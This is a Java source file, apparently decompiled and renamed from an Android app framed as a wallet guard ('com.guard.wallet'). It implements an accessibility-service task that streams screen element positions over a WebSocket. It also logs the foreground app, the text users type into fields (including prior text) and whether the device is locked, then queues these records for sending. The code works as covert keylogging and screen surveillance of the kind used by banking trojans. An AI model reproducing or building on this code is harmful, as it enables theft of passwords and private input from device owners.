package com.guard.wallet.delegate.task;

import com.guard.wallet.core.AppUtils;

import android.graphics.Rect;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.guard.wallet.MainApplication;
import com.guard.wallet.delegate.EngineHelper;
import com.guard.wallet.entity.Point;
import com.guard.wallet.msg.ReadEventMessage;
import com.guard.wallet.msg.ReadScreenEvent;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.stat.AccessibilityEventStatVO;
import com.guard.wallet.stat.KeyboardEventVO;
import java.util.Objects;
import java.util.concurrent.Semaphore;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 截屏 Runnable — 处理无障碍事件和截屏回调。
 *
 * vendor 原始路径: o/b0.java (133 行)
 * 功能: 3 个 case — readScreenEvent / statAccessibilityEvent / semaphore release。
 */
public final class ScreenCaptureTask implements Runnable {

    public final int a;
    public final Object b;
    public final Object c;

    public ScreenCaptureTask(Object obj, Object obj2, int i2) {
        this.a = i2;
        this.c = obj;
        this.b = obj2;
    }

    @Override
    public final void run() {
        int i2 = this.a;
        ReadScreenEvent readScreenEvent = null;
        String str = null;
        Object obj = this.b;
        Object obj2 = this.c;
        switch (i2) {
            case 0:
                AccessibilityEvent accessibilityEvent = (AccessibilityEvent) obj;
                AtomicBoolean atomicBoolean = ((com.guard.wallet.delegate.DelegateUtils) obj2).c;
                try {
                    atomicBoolean.set(true);
                    if (accessibilityEvent != null) {
                        try {
                            if (accessibilityEvent.getSource() != null) {
                                ReadScreenEvent readScreenEvent2 = new ReadScreenEvent(accessibilityEvent.getEventType());
                                AccessibilityNodeInfo source = accessibilityEvent.getSource();
                                Rect rect = new Rect();
                                source.getBoundsInScreen(rect);
                                com.guard.wallet.helper.NodeBoundsHelper.c(rect);
                                readScreenEvent2.getPoints().add(new Point(rect.exactCenterX(), rect.exactCenterY()));
                                readScreenEvent = readScreenEvent2;
                            }
                        } catch (Exception e2) {
                            AppUtils.s("o.c0", e2);
                        }
                    }
                    if (readScreenEvent != null) {
                        String N = com.guard.wallet.utils.SharedPrefsManager.N(new ReadEventMessage(readScreenEvent));
                        if (Integer.valueOf(com.guard.wallet.server.WebSocketManager.getInstance().screenListeners.size()).intValue() > 0) {
                            com.guard.wallet.server.WebSocketManager.getInstance().broadcast(N);
                        }
                        if (AppUtils.z()) {
                            AppUtils.F(N);
                        }
                    }
                } catch (Exception e3) {
                    AppUtils.s("o.c0", e3);
                }
                atomicBoolean.set(false);
                return;
            case 1:
                MyAccessibilityService myAccessibilityService = (MyAccessibilityService) obj2;
                AccessibilityEvent accessibilityEvent2 = (AccessibilityEvent) obj;
                AtomicReference atomicReference = MyAccessibilityService.p;
                myAccessibilityService.getClass();
                if (accessibilityEvent2 != null) {
                    try {
                        if (accessibilityEvent2.getEventType() <= 0) {
                            return;
                        }
                        String charSequence = accessibilityEvent2.getPackageName() != null ? accessibilityEvent2.getPackageName().toString() : null;
                        String charSequence2 = accessibilityEvent2.getClassName() != null ? accessibilityEvent2.getClassName().toString() : null;
                        if ((!Objects.equals(charSequence, "com.android.systemui") || Objects.equals(16, Integer.valueOf(accessibilityEvent2.getEventType())) || Objects.equals(8192, Integer.valueOf(accessibilityEvent2.getEventType())) || myAccessibilityService.k(charSequence)) && MainApplication.getInstance() != null) {
                            MainApplication.getInstance().offerAccessibilityEvent(Integer.valueOf(accessibilityEvent2.getEventType()));
                            AccessibilityEventStatVO accessibilityEventStatVO = new AccessibilityEventStatVO();
                            accessibilityEventStatVO.setContainerCode("ACCESSIBILITY_CONTAINER");
                            accessibilityEventStatVO.setActivePackageName((String) MyAccessibilityService.u2.get());
                            accessibilityEventStatVO.setActiveWindowClassName((String) MyAccessibilityService.v2.get());
                            accessibilityEventStatVO.setEventPackageName(charSequence);
                            accessibilityEventStatVO.setEventClassName(charSequence2);
                            accessibilityEventStatVO.setEventValue(accessibilityEvent2.getEventType());
                            if (Objects.equals(16, Integer.valueOf(accessibilityEvent2.getEventType())) || Objects.equals(8192, Integer.valueOf(accessibilityEvent2.getEventType()))) {
                                KeyboardEventVO keyboardEventVO = new KeyboardEventVO();
                                keyboardEventVO.setBeforeText((accessibilityEvent2.getEventType() != 16 || accessibilityEvent2.getBeforeText() == null) ? null : accessibilityEvent2.getBeforeText().toString());
                                if (accessibilityEvent2.getSource() != null && accessibilityEvent2.getSource().getText() != null) {
                                    str = accessibilityEvent2.getSource().getText().toString();
                                }
                                keyboardEventVO.setEditText(str);
                                keyboardEventVO.setEventText(MyAccessibilityService.E(accessibilityEvent2));
                                accessibilityEventStatVO.setKeyboardEvent(keyboardEventVO);
                            }
                            LockPatternVO B0 = com.guard.wallet.utils.SystemHelper.B0();
                            accessibilityEventStatVO.setIsDeviceLocked(B0.getIsDeviceLocked());
                            accessibilityEventStatVO.setIsDeviceSecure(B0.getIsDeviceSecure());
                            MessageRecordVO messageRecordVO = new MessageRecordVO();
                            messageRecordVO.setIntentCode("android.accessibility.service.USAGE_SUMMARY");
                            messageRecordVO.setExtraBody(accessibilityEventStatVO);
                            if (MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
                                MainApplication.getInstance().getHandlerMsgAndTimer().b(messageRecordVO);
                                return;
                            }
                            return;
                        }
                        return;
                    } catch (Exception e4) {
                        AppUtils.s("statAccessibilityEvent", e4);
                        return;
                    }
                }
                return;
            default:
                /* NIO server instance fetch removed — NIO layer deleted */
                ((Runnable) obj2).run();
                ((Semaphore) obj).release();
                return;
        }
    }
}
